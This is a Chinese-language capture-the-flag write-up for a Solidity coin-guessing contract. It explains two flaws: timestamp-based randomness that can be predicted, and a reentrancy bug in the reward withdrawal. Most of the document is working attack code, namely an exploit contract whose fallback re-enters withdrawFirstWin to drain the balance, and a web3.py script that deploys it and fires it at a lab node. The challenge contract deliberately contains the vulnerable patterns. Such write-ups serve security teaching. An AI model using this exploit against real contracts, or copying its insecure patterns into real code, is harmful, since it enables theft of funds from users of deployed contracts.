# GetoffmyMoney！

## 源码

```js
pragma solidity ^0.8.7;

contract GuessGame {
    address private GamblingHouseOwner;
    address public Player;
    mapping(address => uint256) PlayerWins;
    mapping(address => bool) GetMoney;
    mapping(address => uint256) PlayerPool;
    uint256 public PlayerGuess;

    constructor() payable {
        GamblingHouseOwner = msg.sender;
    }

    function despositFunds(address _addr) private {
        PlayerPool[_addr] = PlayerPool[_addr] + msg.value;
    }

    function guess(uint256 _guess) external payable {
        require(_guess == 0 || _guess == 1);
        require(Player == address(0));
        require(msg.value == 1 ether);
        Player = msg.sender;
        despositFunds(msg.sender);
        PlayerGuess = _guess;
    }

    function RandomCoin() private view returns (uint256) {
        return
            uint256(keccak256(abi.encodePacked(block.timestamp ^ 0x1234567))) %
            2;
    }

    function revealResult() external {
        require(Player == msg.sender);
        uint256 winningOption = RandomCoin();
        if (PlayerGuess == winningOption) {
            PlayerWins[Player] = PlayerWins[Player] + 1;
        } else {
            PlayerWins[Player] = 0;
        }
        Player = address(0);
    }

    function Winer() public view returns (uint256) {
        return (PlayerWins[msg.sender]);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount);

        (bool success, ) = recipient.call{value: amount}("");
    }

    function withdrawMoney(address _to) public payable {
        require(PlayerWins[msg.sender] >= 3);
        require(msg.sender == _to);
        if (PlayerWins[_to] >= 3) {
            uint256 amount = PlayerPool[_to];
            PlayerPool[_to] = 0;
            sendValue(payable(_to), amount);
        }
    }

    function withdrawFirstWin() external {
        require(!GetMoney[msg.sender]);
        PlayerPool[msg.sender] = PlayerPool[msg.sender] + 1 ether;
        withdrawMoney(msg.sender);
        GetMoney[msg.sender] = true;
    }

    function isSolved() public view returns (bool) {
        return address(this).balance == 0;
    }

    receive() external payable {}
}

```

## 题解

猜硬币，每次猜都要转账1 ether，连续猜中三次后可以取出自己之前转入的钱，还会获得额外1 ether的奖励

首先RandomCoin用block.timestamp作为随机数的来源，同一笔交易在同一个区块，block.timestamp相同

（这里也可以不用算随机数，而是一直猜一个数，通过合约中的Winer函数查看猜对次数是否增加，没有增加就回退）

猜对三次后提取余额的withdrawFirstWin函数存在重入漏洞，PlayerPool会加1，GetMoney状态更改在转账之后，转账方式是call，在回调函数中反复调用withdrawFirstWin就能完成重入（回调函数需要设置终止条件，否则最后一个eth转不出来，不知道为什么）

恶意合约

```js
import './GuessGame.sol';

contract Exp {
    GuessGame public game;
    uint public count = 0;
    constructor(address payable _game) {
        game = GuessGame(_game);
    }

    function RandomCoin() private view returns (uint256) {
        return
            uint256(keccak256(abi.encodePacked(block.timestamp ^ 0x1234567))) %
            2;
    }

    function exp() public payable {
        uint256 res;
        for(uint i=0; i<3; i++) {
            res = RandomCoin();
            game.guess{value: 1 ether}(res);
            game.revealResult();
        }
        game.withdrawFirstWin();
    }
    
    /* 或者 猜错了require回退
    function exp() public payable {
        game.guess{value: 1 ether}(0);
        uint before = game.Winer();
        game.revealResult();
        uint after = game.Winer();
        require(after - before == 1);
    }
    */
    
    fallback() external payable {
        if(address(game).balance >= 1 ether){
            count++;
            game.withdrawFirstWin();
        }
    }
}
```

web3py调用脚本

```python
from web3 import Web3, HTTPProvider
import requests
import time
import json

web3 = Web3(HTTPProvider('http://192.168.21.128:8545/'))
print(web3.isConnected())

private_key = "xxx"
account = web3.eth.account.from_key(private_key)
print(account.address)

for i in range(3):
    assert(requests.post("http://192.168.21.128:8080/api/claim", data={"address": account.address}).status_code == 200)
    time.sleep(60)

balance_of_acc = web3.eth.getBalance(account.address)
print(balance_of_acc)  # 账户余额

with open('exp.bin', 'r') as f:
    code = f.read()

with open('exp.abi', 'r') as f:
    abi = json.load(f)
    
game_address = web3.toChecksumAddress("0x5795e2D54FB8E4088FB61589d6A0852ED806bA4a")
balance_of_game = web3.eth.getBalance(game_address)
print(balance_of_game)  # 刚开始的余额

gas_price=5
gas_limit=5000000

newContract = web3.eth.contract(abi=abi,bytecode=code)
construct_txn = newContract.constructor(game_address).buildTransaction({
    'from': account.address,
    'nonce': web3.eth.getTransactionCount(account.address),
    'gas': gas_limit,
    'gasPrice': web3.toWei(gas_price, 'gwei')
}) # 构造合约部署交易

signed = account.signTransaction(construct_txn) # 交易签名
tx_id = web3.eth.sendRawTransaction(signed.rawTransaction) # 交易发送
print(tx_id.hex()) # 打印交易哈希
tx_receipt = web3.eth.waitForTransactionReceipt(tx_id.hex())
print(tx_receipt.contractAddress)
exp_address = tx_receipt.contractAddress

exp = web3.eth.contract(address=exp_address, abi=abi)

tx = exp.functions.exp().buildTransaction({
        "from": account.address,
        "value": web3.toWei(3, 'ether'),
        'gasPrice': web3.toWei(gas_price, 'gwei'),
        "gas": gas_limit,
        "nonce": web3.eth.getTransactionCount(account.address),
})
signed_tx = account.signTransaction(tx)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction).hex()
print(tx_hash)
receipt = web3.eth.waitForTransactionReceipt(tx_hash)
print(receipt)

balance_of_game = web3.eth.getBalance(game_address)
print(balance_of_game)  #最后的余额
```

